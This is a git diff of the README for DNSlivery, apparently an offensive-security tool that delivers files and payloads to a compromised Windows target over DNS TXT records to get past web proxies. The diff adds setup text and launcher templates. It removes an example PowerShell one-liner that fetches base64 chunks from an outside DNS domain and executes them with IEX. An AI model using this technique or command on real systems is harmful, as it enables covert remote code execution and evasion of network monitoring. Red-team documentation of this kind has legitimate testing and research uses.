@@ -7,12 +7,13 @@ Easy files and payloads delivery over DNS.
 - [DNSlivery](#dnslivery)
 - [Acknowledgments](#acknowledgments)
 - [Description](#description)
+  - [TL;DR](#tldr)
   - [What problem are you trying to solve?](#what-problem-are-you-trying-to-solve)
   - [How does it work?](#how-does-it-work)
   - [Requirements](#requirements)
 - [Setup](#setup)
   - [DNS Zone](#dns-zone)
-  - [DNSLivery](#dnslivery)
+  - [DNSlivery](#dnslivery-1)
 - [Usage](#usage)
   - [Server](#server)
   - [Target](#target)
@@ -21,6 +22,14 @@ Easy files and payloads delivery over DNS.
 This project has been originally inspired by [PowerDNS](https://github.com/mdsecactivebreach/PowerDNS) and [Joff Thyer](https://twitter.com/joff_thyer)'s technical segment on the Paul's Security Weekly podcast #590 ([youtu.be/CP6cIwFJswQ](https://youtu.be/CP6cIwFJswQ)).
 
 # Description
+## TL;DR
+DNSlivery allows to deliver files to a target using DNS as the transport protocol.
+
+**Features**:
+- allows to print, execute or save files to the target
+- does not require any client on the target
+- does not require a full-fledged DNS server
+
 ## What problem are you trying to solve?
 Easily deliver files and/or payloads to a compromised target where classic web delivery is not possible and **without the need for a dedicated client software**. This applies to restricted environments where outgoing web traffic is forbidden or simply inspected by a curious web proxy.
 
@@ -33,26 +42,31 @@ In comparison, DNSlivery only provides one-way communication from your server to
 ## How does it work?
 Just like most DNS tunneling tools, DNSlivery uses `TXT` records to store the content of files in their base64 representation. However, it does not require to setup a full-fledged DNS server to work. Instead, it uses the [scapy](https://scapy.net/) library to listen for incoming DNS packets and craft the desired response. 
 
-![dnslivery-network.png](img/dnslivery-network.png)
+![network-process.png](img/network-process.png)
 
 As most files do not fit in a single `TXT` record, DNSlivery will create multiple ordered records containing base64 chunks of the file. As an example, the above diagram illustrates the delivery of the 42<sup>nd</sup> chunk of the file named `file`.
 
-In order to easily retrieve all base64 chunks and put them back together in their original format, DNSlivery will also generate a single cleartext stager per file.
+In order to retrieve all base64 chunks and put them back together without the need for a dedicated client on the target, DNSlivery will generate for every file:
 
-![stager-delivery.png](img/stager-delivery.png)
+- a simple cleartext launcher
+- a reliable base64 encoded stager
 
-Currently, only PowerShell stagers are supported.
+![two-stages-delivery.png](img/two-stages-delivery.png)
 
+This two-stages delivery process is required to add features to the stager (s.a. handling lost DNS responses) that would otherwise not fit in a single `TXT` record.
+
+### Note on target compatibility
+Currently, only PowerShell targets are supported. However, DNSlivery could be improved to support additional targets such as bash or python. Please let me know [@no0be](https://twitter.com/no0be) if this is a feature that you would like to see being implemented.
 
 ## Requirements
 DNSlivery does not require to build a complex server infrastructure. In fact, there are only two simple requirements: 
 
 - be able to create a `NS` record in your public DNS zone
-- have a Linux server capable of receiving udp/53 traffic from the Internet
+- have a Linux server capable of receiving `udp/53` traffic from the Internet
 
 # Setup
 ## DNS Zone
-The first step is to delegate a sub-domain to the server that will run DNSlivery by creating a new `NS` record. As an example, I created the following record to delegate the sub-domain `dnsd.no0.be` to the server at `vps.no0.be`.
+The first step is to delegate a sub-domain to the server that will run DNSlivery by creating a new `NS` record in your domain. As an example, I created the following record to delegate the sub-domain `dnsd.no0.be` to the server at `vps.no0.be`.
 
 ```
 dnsd    IN  NS vps.no0.be.
@@ -60,7 +74,7 @@ dnsd    IN  NS vps.no0.be.
 
 If your zone is managed by a third-party provider, refer to their documentation to create the `NS` record.
 
-## DNSLivery
+## DNSlivery
 The only requirements to run DNSlivery are `python3` and its `scapy` library.
 ```bash
 git clone https://github.com/no0be/DNSlivery.git && cd DNSlivery
@@ -109,47 +123,20 @@ As the charset allowed for domain names is much more restrictive than for UNIX f
 **Be aware that the current normalization code is not perfect as it does not take overlapping filenames or size limit into account.**
 
 ## Target
-On the target, start by **retrieving the stager** of the desired file by requesting its dedicated `TXT` record.
+On the target, start by **retrieving the launcher** of the desired file by requesting its dedicated `TXT` record. The following three launchers are supported:
 
-| Action  | Stager                     | Description                                           |
-| ------- | -------------------------- | ----------------------------------------------------- |
-| Print   | `[filename].[domain]`      | (**Default**) Print the delivered file to the console |
-| Execute | `[filename].exec.[domain]` | Execute the delivered file (useful for scripts)       |
-| Save    | `[filename].save.[domain]` | Save the delivered file to disk (useful for binaries) |
+| Action  | Launcher                    | Description                                           |
+| ------- | --------------------------- | ----------------------------------------------------- |
+| Print   | `[filename].print.[domain]` | (**Default**) Print the delivered file to the console |
+| Execute | `[filename].exec.[domain]`  | Execute the delivered file (useful for scripts)       |
+| Save    | `[filename].save.[domain]`  | Save the delivered file to disk (useful for binaries) |
 
-Then, simply **copy and paste the stager quoted in the response to a PowerShell console** to retrieve the file on the target.
+```cmd
+nslookup -type=txt [filename].[stager].[domain]
+```
+
+Then, simply **copy and paste the launcher quoted in the DNS response to a PowerShell console** to retrieve the file on the target.
 
 **Example**:
-```
-PS> nslookup -type=txt file.exec.dnsd.no0.be
-Server:  one.one.one.one
-Address:  1.1.1.1
 
-Non-authoritative answer:
-file.exec.dnsd.no0.be   text =
-
-        "IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((0..6 | % {Resolve-DnsName -type TXT -Name "file.$_.dnsd.no0.be" | Where-Object Section -eq Answer | Select -ExpandProperty Strings}))))"
-
-PS> IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((0..6 | % {Resolve-DnsName -type TXT -Name "file.$_.dnsd.no0.be" | Where-Object Section -eq Answer | Select -ExpandProperty Strings}))))
-Fight Bugs                      |     |
-                                \\_V_//
-                                \/=|=\/
-                                 [=v=]
-                               __\___/_____
-                              /..[  _____  ]
-                             /_  [ [  M /] ]
-                            /../.[ [ M /@] ]
-                           <-->[_[ [M /@/] ]
-                          /../ [.[ [ /@/ ] ]
-     _________________]\ /__/  [_[ [/@/ C] ]
-    <_________________>>0---]  [=\ \@/ C / /
-       ___      ___   ]/000o   /__\ \ C / /
-          \    /              /....\ \_/ /
-       ....\||/....           [___/=\___/
-      .    .  .    .          [...] [...]
-     .      ..      .         [___/ \___]
-     .    0 .. 0    .         <---> <--->
-  /\/\.    .  .    ./\/\      [..]   [..]
- / / / .../|  |\... \ \ \    _[__]   [__]_
-/ / /       \/       \ \ \  [____>   <____]
-```
+![demo-target.git](img/demo-target.gif)
